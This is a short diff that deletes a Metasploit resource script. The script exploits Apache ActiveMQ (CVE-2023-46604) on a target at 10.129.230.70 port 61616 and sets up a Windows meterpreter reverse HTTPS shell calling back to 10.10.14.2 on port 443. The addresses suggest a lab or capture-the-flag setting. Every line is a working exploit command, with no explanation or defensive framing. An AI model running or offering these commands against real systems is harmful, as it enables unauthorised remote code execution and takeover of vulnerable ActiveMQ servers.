@@ -1,9 +1,0 @@
-use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
-set RHOSTS 10.129.230.70
-set RPORT 61616
-set LHOST 10.10.14.2
-set LPORT 443
-set payload cmd/windows/https/x64/meterpreter/reverse_https
-run -j
-sleep 20
-sessions
